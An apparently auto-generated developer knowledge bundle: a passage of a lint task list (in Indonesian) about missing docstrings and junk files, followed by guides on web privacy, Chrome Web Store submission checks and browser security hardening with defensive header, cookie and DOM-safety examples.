- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 10: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 11: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 12: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 13: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 14: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 15: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 16: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 17: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 18: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 19: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 20: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 21: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 22: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 23: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 24: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 25: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 26: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 27: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 28: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 29: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 30: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 31: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 32: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 33: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 34: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 35: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 36: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


### [ ] Task 37: INFO: [vcs-architect] Potential junk or temporary file detected.
- **🧐 Why?**: File sampah atau temporary (seperti .log atau .DS_Store) mengotori repository dan bisa menyebabkan masalah performa pada Git.
- **💡 Action**: Hapus file ini atau tambahkan polanya ke dalam .gitignore agar tidak terlacak oleh Version Control.


---
*Generated by Nexus Orchestrator*
        

---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security]

### 📘 KNOWLEDGE: NEXUS_PRIVACY.MD

# Web Privacy Guidelines for Developers
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Web application developers must treat privacy as a foundational architectural requirement, not just a legal compliance checkbox. As the web ecosystem shifts away from passive tracking toward explicit, user-consented interactions, building privacy-preserving applications is critical for user trust and security.

This document provides high-level principles and detailed, actionable guidelines with code examples for web developers.

## High-Level Overview

These core themes should guide your approach to privacy in web development:

1.  **Automation Asymmetry & Privacy Labor**: Do not offload the burden of protecting privacy to the user (privacy labor). Avoid overwhelming users with complex consent dialogs (automation asymmetry). Users have limited time and attention; offloading privacy choices to them is often ineffective and causes fatigue. Systems should be privacy-protective by default.
2.  **Data Minimization**: "If you don't have the data, you can't lose it." Collect only the bare minimum required for the immediate task. Reducing data storage reduces the risk of breach and builds user trust.
3.  **Purpose Limitation**: Data collected for one purpose must not be used for another without fresh consent. Repurposing data without explicit agreement violates the trust relationship with the user.
4.  **Transparency by Default**: Be honest and clear about why data is collected, where it goes, and how long it is kept. Transparency builds trust and can be a unique selling point for your application.
5.  **Trustworthy Agency**: Treat your application as an agent acting in the user's best interest. This means protecting them from intrusive behaviors, unnecessary data exposure, and acting as a loyal fiduciary to the user rather than serving third-party interests.

## Detailed Guidelines

### 1. Data Minimization and Purpose Limitation

Reducing the amount of data collected and strictly limiting its use is the most effective way to protect user privacy.

#### DOs:
*   **DO** collect data at the lowest granularity necessary. If you only need to know if a user is in a certain age bracket (e.g., 18-34), ask for the bracket, not the exact date of birth.
*   **DO** provide guest checkout options for e-commerce to avoid forced account creation, which reduces data collection and cart abandonment.
*   **DO** delete data as soon as the purpose for its collection has been fulfilled.
*   **DO** use techniques like "fuzzing" or adding noise to data (Differential Privacy) when gathering aggregate statistics.

#### DON'Ts:
*   **DON'T** collect data speculatively "just in case" it might be useful in the future.
*   **DON'T** reuse data collected for one purpose (e.g., security verification) for another (e.g., marketing) without explicit user consent.

#### Code Examples:

**Fuzzing Data Collection (HTML/JS)**
Instead of asking for exact age:
```html
<label for="age-bracket">Age Bracket:</label>
<select id="age-bracket" name="age-bracket">
  <option value="18-34">18-34</option>
  <option value="35-49">35-49</option>
  <option value="50+">50+</option>
</select>
```

### 2. Transparency and Trust

Build trust by being open about your data practices and providing easy ways for users to control their data.

#### DOs:
*   **DO** provide inline explanations for why data is requested. Place the explanation directly next to the input field.
*   **DO** provide a clear reason and context *before* requesting powerful browser permissions (e.g., camera, location).
*   **DO** consider using the **Page Embedded Permission Control (PEPC)** `<permission>` element, if supported, to make permission requests declarative, user-initiated, and act as data mediators.
*   **DO** use the `Clear-Site-Data` header when a user logs out to ensure no lingering data remains in the browser.
*   **DO** make it as easy to opt-out or delete an account as it was to sign up.

#### DON'Ts:
*   **DON'T** bury data collection explanations in long, complex privacy policies.
*   **DON'T** use deceptive patterns (dark patterns) to trick users into giving consent.

#### Code Examples:

**Inline Transparency (HTML)**
```html
<div>
  <label for="phone">Phone Number (Optional)</label>
  <input id="phone" type="tel" name="phone">
  <a href="#phone-help">Why do we ask for this?</a>
  <aside id="phone-help">
    We only use your phone number to send two-factor authentication codes for account security.
  </aside>
</div>
```

**Clear-Site-Data on Logout (HTTP Response)**
```http
HTTP/1.1 200 OK
Clear-Site-Data: "*"
```
*Note: If clearing the cache, avoid sending this on the main navigation page to prevent blocking UI rendering on slow devices; trigger it via a subresource.*

**Page Embedded Permission Control (HTML)**
```html
<!-- Declarative permission element with fallback -->
<permission type="geolocation" onpromptdismiss="updateMap()">
  <!-- Fallback for unsupported browsers -->
  <button onclick="navigator.geolocation.getCurrentPosition(updateMap)">
    Use my location
  </button>
</permission>
```

### 3. Security and Data Handling for Privacy
 
Privacy relies on a foundation of secure coding. Vulnerabilities in the application or insecure storage directly lead to privacy violations.
 
#### DOs:
*   **DO** scrub Personally Identifiable Information (PII) from application logs. Use automated masking for emails, tokens, and IDs.
*   **DO** use `HttpOnly` flags for cookies storing session identifiers to prevent other scripts from accessing them.
*   **DO** implement rate limiting on sensitive endpoints (e.g., user search or profile views) to prevent bulk data scraping.
*   **DO** use **CHIPS (Cookies Having Independent Partitioned State)** by appending the `Partitioned` attribute for 1:1 embeds that do not share state across top-level sites.
 
#### DON'Ts:
*   **DON'T** store sensitive tokens or PII in `localStorage`, as it is accessible by any embedded script.
*   **DON'T** rely on unpartitioned `SameSite=None` cookies.
 
#### Code Examples:
 
**Secure Session Cookie (HTTP)**
```http
Set-Cookie: session_id=xyz123; Secure; HttpOnly; SameSite=Lax
```

**CHIPS Cookie (HTTP)**
```http
Set-Cookie: theme_pref=dark; SameSite=None; Secure; Path=/; Partitioned; HttpOnly
```

### 4. Third-Party Audits and Mitigations

Third-party scripts and resources are a common source of privacy leaks. You are responsible for the third parties you bring into your application.

#### DOs:
*   **DO** conduct regular technical audits of network requests using DevTools or HAR files to identify what data third parties are collecting.
*   **DO** use the **Façade Pattern** for heavy embeds (like YouTube or TikTok). Display a static thumbnail and load the interactive iframe only after the user clicks.
*   **DO** use privacy-preserving options for embeds when available (e.g., `youtube-nocookie.com`).
*   **DO** replace heavy social sharing SDKs with simple, static HTML links that do not track users.
*   **DO** use the **Federated Credential Management API (FedCM)** to mediate "Sign-In" flows natively, preventing IdP tracking of Relying Parties prior to user consent.

#### DON'Ts:
*   **DON'T** assume a third party is privacy-safe just because it is popular.
*   **DON'T** load third-party scripts on pages where sensitive data (like checkout or health info) is handled unless strictly necessary.

#### Code Examples:

**Privacy-Preserving Social Sharing (HTML)**
```html
<!-- No JS SDK required -->
<a href="https://x.com/intent/tweet?text=Check%20this%20out&url=https%3A%2F%2Fexample.com" 
   rel="noopener" target="_blank">
   Share on X
</a>
```

**Video Façade Pattern (HTML/JS)**
```html
<div id="video-container" data-video-id="abc123">
  <img src="https://img.youtube.com/vi/abc123/maxresdefault.jpg" alt="Play Video" id="play-btn">
</div>

<script>
document.getElementById('play-btn').addEventListener('click', function() {
  const container = document.getElementById('video-container');
  const videoId = container.dataset.videoId;
  container.innerHTML = `<iframe src="https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1" allowfullscreen></iframe>`;
});
</script>
```

**FedCM Sign-In (JavaScript)**
```javascript
try {
  const credential = await navigator.credentials.get({
    identity: {
      providers: [{
        configURL: "https://idp.example/fedcm.json",
        clientId: "rp-client-id-123",
        nonce: "a_secure_random_nonce_value"
      }]
    }
  });
  authenticateWithBackend(credential.token);
} catch (error) {
  // Handle FedCM login failure
}
```

### 5. Privacy-Preserving Headers

Use standard HTTP headers to instruct the browser to enforce privacy boundaries.

#### DOs:
*   **DO** use `Permissions-Policy` to disable powerful features (like camera, microphone, geolocation) by default, enabling them only where required.
*   **DO** set a strict `Referrer-Policy` to prevent leaking sensitive URL parameters to third parties.

#### Code Examples:

**Strict Referrer Policy (HTTP)**
```http
Referrer-Policy: strict-origin-when-cross-origin
```

**Defensive Permissions Policy (HTTP)**
Disables powerful features for all origins by default.
```http
Permissions-Policy: geolocation=(), camera=(), microphone=(), accelerometer=()
```

### 6. Fingerprinting and User-Agent Reduction

Avoid techniques that attempt to uniquely identify users covertly based on their device configuration. Fingerprinting takes away user control because it relies on unchanging characteristics and happens invisibly, preventing users from opting out or clearing their identifier.

#### DOs:
*   **DO** use **Feature Detection** instead of User-Agent sniffing to determine if a browser supports a capability.
*   **DO** use **User-Agent Client Hints** (UA-CH) if supported by the browser, when specific device targeting is required.

#### DON'Ts:
*   **DON'T** use canvas rendering, font lists, or audio/video device enumerations to build a device fingerprint.
*   **DON'T** rely on the full granularity of the traditional `navigator.userAgent` string.

#### Code Examples:

**Feature Detection (JavaScript)**
```javascript
// GOOD: Check if the API exists
if ('IntersectionObserver' in window) {
  const observer = new IntersectionObserver(...);
} else {
  // Fallback
}

// BAD: Sniffing UA
// if (navigator.userAgent.includes("Chrome/100")) ...
```

**User-Agent Client Hints (JavaScript)**
```javascript
if (navigator.userAgentData) {
  navigator.userAgentData.getHighEntropyValues(["platformVersion", "architecture"])
    .then(ua => {
      console.log(ua.platformVersion);
    });
}
```

### 7. Data Rights and User Control

Empower users to exercise their rights over their personal data.

#### DOs:
*   **DO** provide clear mechanisms for users to **access** all data you have collected about them.
*   **DO** implement automated or easy manual flows for **data deletion** (erasure).
*   **DO** allow users to correct inaccurate information associated with their identity.

#### DON'Ts:
*   **DON'T** make the deletion process difficult or require users to contact support if sign-up was automated.
*   **DON'T** retaliate against users who exercise their data rights by denying access to non-dependent services.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, api]

### 📘 KNOWLEDGE: NEXUS_REVIEW-CHECKLIST.MD

# Pre-Publish Review Checklist
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Run through this checklist before every submission to the Chrome Web Store. Each item
corresponds to a common rejection reason or publishing failure.

## Manifest & Package

- [ ] **manifest_version is 3** — Manifest V2 is no longer accepted for new submissions.
- [ ] **Version bumped** — CWS rejects uploads with a version ≤ the currently published
      version. Use semver: bump patch for fixes, minor for features, major for breaking
      changes.
- [ ] **Name matches CHROMEWEBSTORE.md** — The `name` field in manifest.json must exactly
      match what you put in the store listing.
- [ ] **Description in manifest ≤ 132 chars** — This is the short description shown in
      chrome://extensions. It should match or be close to your CWS short description.
- [ ] **No unnecessary files in ZIP** — Exclude: `.git/`, `node_modules/`, `.env`,
      `*.map`, test files, build configs, `CHROMEWEBSTORE.md` itself, `README.md`,
      `.DS_Store`, `thumbs.db`. Use a build script or `.cws-ignore`-style exclusion.
- [ ] **ZIP under 2GB** — Maximum package size. Most extensions should be under 10MB.
- [ ] **No absolute file paths** — All paths in manifest.json must be relative.

## Permissions

- [ ] **Minimum permissions** — Only request what you need. `<all_urls>` is a red flag.
      Use specific host_permissions like `*://*.example.com/*` when possible.
- [ ] **Every permission justified** — Check the Permissions Justification section in
      CHROMEWEBSTORE.md. The CWS dashboard has a field for each permission — you'll need
      to fill these in during submission.
- [ ] **activeTab preferred over tabs + <all_urls>** — If you only need access to the
      current tab when the user clicks your icon, `activeTab` is the right permission.
- [ ] **No unused permissions** — If you removed a feature that used a permission, remove
      the permission from manifest.json too. Leftover permissions cause rejection.
- [ ] **host_permissions justified** — Explain which features need access to which domains
      and why.

## Store Listing Content

- [ ] **Detailed description is specific** — Describes exactly what the extension does.
      No vague marketing language. The review team reads this.
- [ ] **Single purpose is narrow** — One sentence that clearly states the primary function.
      "Manages bookmarks into categorized folders" not "Productivity enhancement tool."
- [ ] **No misleading claims** — Don't claim features you don't have. Don't exaggerate
      performance claims.
- [ ] **No keyword stuffing** — Don't repeat keywords unnaturally in the description.
- [ ] **No trademark violations** — Don't use other companies' names, logos, or trademarks
      in your extension name, description, or screenshots unless you have authorization.
- [ ] **Contact email is valid** — The email shown on the listing must be monitored. Google
      sends important notifications (takedowns, policy changes) to this address.

## Graphics

- [ ] **Store icon**: 128×128 PNG, no transparency issues, readable at small sizes.
- [ ] **At least 1 screenshot**: 1280×800 or 640×400 pixels. Shows the extension in action.
- [ ] **Screenshots are current** — Match the current version of the extension UI. Outdated
      screenshots can trigger rejection.
- [ ] **No misleading screenshots** — Screenshots must accurately represent the extension.
- [ ] **No phone/tablet mockups** — Unless the extension actually works on those devices.
- [ ] **Small promo tile** (recommended): 440×280 PNG or JPEG. Used for featured placements.

## Privacy & Compliance

- [ ] **Data disclosure form matches reality** — The CWS data use disclosure checkboxes
      must accurately reflect what the extension code actually does. Mismatch = rejection.
- [ ] **Privacy policy URL is live** — Visit the URL yourself. Confirm it loads and
      contains an actual privacy policy, not a 404 or placeholder.
- [ ] **Privacy policy matches disclosure** — The text of the policy must be consistent
      with what you declared in the disclosure form.
- [ ] **chrome.storage.sync disclosed** — If you use `chrome.storage.sync`, data is
      transmitted to Google's servers. This counts as off-device transmission.
- [ ] **Remote code prohibition** — Extensions cannot execute remotely hosted code.
      All JS must be bundled in the extension package. No loading scripts from CDNs
      at runtime (Manifest V3 enforces this, but verify).
- [ ] **No obfuscated code** — Minification is fine. Obfuscation (intentionally making
      code unreadable) is prohibited and will cause rejection.

## Functionality

- [ ] **Extension works** — Load it unpacked in Chrome, test all features. Check the
      console for errors.
- [ ] **No crashes or blank popups** — Test popup, side panel, options page, content
      scripts. All should load without errors.
- [ ] **Works on intended sites** — If the extension targets specific websites, verify
      it works on current versions of those sites.
- [ ] **Graceful degradation** — The extension should handle edge cases (no internet,
      empty data, restricted pages like chrome:// URLs) without crashing.
- [ ] **Uninstall is clean** — No persistent side effects after the extension is removed.
- [ ] **No excessive resource use** — The extension shouldn't noticeably slow down
      browsing. Content scripts in particular should be lightweight.

## Updates (for existing extensions)

- [ ] **CHROMEWEBSTORE.md version history updated** — New entry with version, date, and
      summary of changes.
- [ ] **Last Updated date bumped** — If any user-facing changes were made.
- [ ] **Feature list in descriptions updated** — If new features were added.
- [ ] **Permissions justification updated** — If manifest.json permissions changed.
- [ ] **Screenshots refreshed** — If the UI changed significantly.
- [ ] **Privacy disclosures updated** — If data practices changed.

## Packaging Script

To create a clean ZIP for submission, use a script like:

```bash
#!/bin/bash
# package-extension.sh — Creates a clean ZIP for Chrome Web Store submission

EXTENSION_NAME="my-extension"
VERSION=$(node -p "require('./manifest.json').version")
OUTPUT="${EXTENSION_NAME}-v${VERSION}.zip"

# Remove old package
rm -f "$OUTPUT"

# Create ZIP excluding dev files
zip -r "$OUTPUT" . \
  -x ".git/*" \
  -x "node_modules/*" \
  -x ".env" \
  -x "*.map" \
  -x "tests/*" \
  -x "__tests__/*" \
  -x "*.test.*" \
  -x "*.spec.*" \
  -x ".eslintrc*" \
  -x ".prettierrc*" \
  -x "tsconfig.json" \
  -x "package.json" \
  -x "package-lock.json" \
  -x "webpack.config.*" \
  -x "vite.config.*" \
  -x "rollup.config.*" \
  -x "CHROMEWEBSTORE.md" \
  -x "README.md" \
  -x "CHANGELOG.md" \
  -x ".DS_Store" \
  -x "Thumbs.db" \
  -x "*.sh" \
  -x "store-assets/*"

echo "Packaged: $OUTPUT ($(du -h "$OUTPUT" | cut -f1))"
```

Customize the exclusion list for your project. The key principle: ship only what Chrome
needs to run the extension.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, performance, tdd, api]

### 📘 KNOWLEDGE: NEXUS_SECURITY.MD

# Web Security
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Guidelines for implementing preventative security measures on the web safely and incrementally.

**NOTE**: This skill covers standard web platform defenses, focusing mostly on the browser. Applications still require comprehensive server-side security, authorization models, and input validation.

## Table of Contents

- When to apply this skill
- Phase 1: Quick Wins & Obvious Anti-Patterns
  - 1.1 Secure Contexts
  - 1.2 Avoid Dangerous DOM Sinks
  - 1.3 Secure Cookies
  - 1.4 Clickjacking Protection (Frame-Ancestors & X-Frame-Options)
  - 1.5 Secure Window Messaging (postMessage)
- Phase 2: Discovery & Data Collection (Prerequisites)
  - 2.1 Inspect the Application
  - 2.2 Deploy Report-Only Policies
  - 2.3 Data Hygiene for Reports
  - 2.4 Automated Discovery via Browser APIs and DevTools
- Phase 3: Interpreting Results & Enforcement
  - Core enforcement (data-driven rollouts)
    - 3.1 Analyzing CSP Reports
    - 3.2 Transitioning to CSP Enforcement
    - 3.3 Trusted Types Enforcement
    - 3.4 Cross-Origin Opener Policy (COOP)
    - 3.5 Cross-Origin Resource Policy (CORP)
    - 3.6 Cross-Origin Isolation
    - 3.7 Fetch Metadata (Resource Isolation)
  - Companion policies (deploy in parallel)
    - HTTP Strict Transport Security (HSTS)
    - X-Content-Type-Options
    - Referrer Policy
    - Permissions Policy
    - Subresource Integrity (SRI)
    - Cross-Origin Resource Sharing (CORS)
    - Clear-Site-Data (Logout)

## When to apply this skill

The right starting point depends on the application:

- **Retrofitting an existing app**: Always start at Phase 1. Strict policies applied without discovery will break the app. Treat Phase 2 (report-only) as a prerequisite for any Phase 3 enforcement.
- **Greenfield app or new feature**: You can adopt Phase 3 enforced policies directly, but still wire up reporting from day one.
- **SaaS template / framework defaults**: Ship Phase 1 hygiene and Phase 3 policies enabled by default, with Phase 2 reporting on so downstream users can detect regressions.

If you are unsure which case applies, default to Phase 1 → 2 → 3 in order.

**Focusing on Leverage**: While Phase 1 and 2 establish baseline hygiene and data gathering, Phase 3 core enforcement represents the highest-leverage security work. Specifically, Injection/XSS mitigation through CSP (§3.2) and Trusted Types (§3.3) addresses the largest practical threat, while companion policies and isolation defenses provide important defense-in-depth.

## Phase 1: Quick Wins & Obvious Anti-Patterns

Before attempting to deploy global security policies, focus on code-level hygiene and immediate fixes that do not risk breaking the application.

### 1.1 Secure Contexts
- **DO**: Deliver resources over HTTPS to protect against both passive and active network attackers.
- **DO**: Serve a header like `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` to force HTTPS whenever possible.
- **TIP**: In production rollout, start with a short `max-age` (e.g., 300 seconds) and incrementally increase to 1 year. A misconfigured HSTS with a long max-age can render the site permanently inaccessible until the cache expires in every browser that saw it.

### 1.2 Avoid Dangerous DOM Sinks
- **DO**: Prefer `textContent` or `innerText` over `innerHTML` when setting text content.
- **DO**: Use `setHTML` (part of the Sanitizer API) when available to safely insert HTML.
- **DO NOT**: Use `innerHTML` or `setHTMLUnsafe` with untrusted or unsanitized input.
- **DO**: Use DOMParser or create elements programmatically (`document.createElement`) instead of concatenating HTML strings.

**Dangerous sinks to grep for**: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout` with a string argument, `script.src`.

**Code Pattern:**
```javascript
// Unsafe
element.innerHTML = `Hello, ${untrustedName}!`;

// Safe
element.textContent = `Hello, ${untrustedName}!`;
```

Trusted Types can enforce this pattern at runtime by blocking string assignments to dangerous sinks. Deploying it is a CSP enforcement step with real breakage risk — see §3.3.

### 1.3 Secure Cookies
Ensure new cookies are configured securely by default.
- **DO**: Prefer naming cookies with the `__Host-` prefix when they'll only be used by one domain. This requires the `Secure` and `Path=/` attributes to be set, and the `Domain` attribute to be omitted. This protects against same-site and network attackers.
- **DO**: Prefer naming cookies with the `__Secure-` prefix when `__Host-` isn't appropriate. This requires the `Secure` attribute, and protects against network attackers.
- **DO**: Explicitly set `SameSite=Lax` for standard first-party cookies.
- **DO**: If your application will be embedded as an iframe in third-party contexts, use `SameSite=None; Secure; Partitioned`.
- **DO NOT**: Rely on unpartitioned `SameSite=None` — these are being systematically blocked for tracking prevention.

```http
Set-Cookie: __Host-session_id=value; SameSite=Lax; HttpOnly; Secure; Path=/
Set-Cookie: third_party_var=value; SameSite=None; Secure; Partitioned
```

### 1.4 Clickjacking Protection (Frame-Ancestors & X-Frame-Options)
Clickjacking protection is easy to deploy, carries extremely low risk of breaking legitimate functionality, and provides immediate defense against malicious UI redressing.
- **DO**: Set the `X-Frame-Options: SAMEORIGIN` header to prevent other sites from embedding your pages in an iframe (or use `DENY` if you should never be embedded).
- **DO**: For fine-grained control, use `frame-ancestors 'self'` (or specified trusted domains) in your CSP header.

```http
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self' https://trusted-partner.com;
```

### 1.5 Secure Window Messaging (postMessage)
If your application communicates with other origins using `window.postMessage`, you must strictly validate the sender and receiver.
- **DO**: Always validate the `event.origin` of incoming messages on the receiver side using strict equality against a list of trusted origins. Do **not** trust wildcards (`*`) or unverified payloads.
- **DO**: Always specify a target origin (rather than the wildcard `*`) when calling `postMessage` to send sensitive data, ensuring only the intended origin can receive it.
- **DO**: Validate and sanitize the properties of incoming message payloads before performing operations or writing them to DOM sinks. Manual JSON serialization is unnecessary as `postMessage` handles object cloning internally.

```javascript
// Receiver (Safe - traditional string check)
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://trusted-origin.com') return;
  const data = event.data;
  if (data && data.action === 'update') {
    // Process data safely
  }
});

// Sender (Safe)
targetWindow.postMessage({ action: 'update' }, 'https://trusted-origin.com');
```

## Phase 2: Discovery & Data Collection (Prerequisites)

Do not blindly apply strict policies to an existing application. You must first understand the application's constraints by collecting data.

### 2.1 Inspect the Application
Before turning anything on, gather facts:
- **Grep for existing security headers** in server config, middleware, CDN/edge config, and meta tags: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`, `Permissions-Policy`, `Cross-Origin-*`, `Access-Control-*`, `Timing-Allow-Origin`, `Reporting-Endpoints`.
- **Enumerate inline scripts and styles** in server-rendered templates and static HTML — these will need nonces, hashes, or refactoring.
- **List third-party script origins** loaded by the app (analytics, ads, tag managers, CDNs). These dictate what `script-src` must allow or whether `'strict-dynamic'` is viable.
- **Identify popup-dependent flows**: OAuth, payment gateways, SSO. These constrain COOP choices.
- **Identify cross-origin embeds and embedders**: iframes the app loads, and sites that embed the app. These constrain COEP/CORP/`frame-ancestors`.
- **Enumerate required browser features**: List any features (camera, geolocation, microphone, fullscreen) used by the app or embedded third-party widgets to inform `Permissions-Policy`.
- **Identify dynamic dependencies**: Check if third-party scripts are versioned or if they receive silent updates, determining if `SRI` can be used.
- **Map cross-site integrations**: List all incoming Webhooks, cross-site APIs, or SSO redirect endpoints so `Fetch Metadata` resource isolation policies don't break them.

### 2.2 Deploy Report-Only Policies
Use "Report-Only" headers to identify potential breakages before they happen.
- **DO**: Use report-only headers to dry-run policies without enforcement. Standard report-only headers include:
  - `Content-Security-Policy-Report-Only` for CSP rules.
  - `Cross-Origin-Opener-Policy-Report-Only` for COOP isolation.
  - `Cross-Origin-Embedder-Policy-Report-Only` for COEP isolation.
  - `Document-Policy-Report-Only` for document features.
- **DO**: Define a `Reporting-Endpoints` header so violations have somewhere to go, and reference its name from `report-to`. Recommend setting an endpoint named `default`, which will automatically capture deprecation and crash reports.
- **DO**: Run report-only for long enough to cover real traffic patterns (typically days to weeks), not just synthetic testing.

**Example headers:**
```http
Reporting-Endpoints: default="https://reports.example/default", main-endpoint="https://reports.example/main"
Content-Security-Policy-Report-Only: script-src 'nonce-{RANDOM}' 'strict-dynamic' 'report-sample'; object-src 'none'; base-uri 'none'; report-to main-endpoint;
```

The `'strict-dynamic'`, `https:`, and `'unsafe-inline'` tokens together form a backwards-compatibility ladder: modern browsers honor `'strict-dynamic'` (nonce-propagating) and ignore the others; older browsers fall back to `https:`; very old browsers fall back to `'unsafe-inline'`. The fallbacks are harmless on any browser that supports a stricter token.

